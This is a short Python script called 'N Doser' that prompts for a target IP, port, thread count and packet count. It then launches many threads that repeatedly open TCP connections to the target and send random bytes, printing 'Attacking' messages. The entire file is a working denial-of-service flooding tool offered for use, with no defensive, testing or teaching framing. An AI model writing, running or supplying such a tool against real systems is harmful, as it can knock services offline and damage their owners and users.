import socket
import pyfiglet
import threading
import random
name = pyfiglet.figlet_format("N Doser", font="standard")
print(name)
ip = input("Enter target ip: ")
port = int(input("Enter port:"))
thread = int(input("Threads: "))
packet = int(input("Enter packet: "))
def fnc():
    hello = random.randbytes(10)
    l = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            for i in range(packet):
                sock.send(hello)
                l += 1
                print(f"Attacking {ip} and sent {l} packet")

        except:
            print("Can not connect")

for i in range(thread):
    th = threading.Thread(target=fnc)
    th.start()
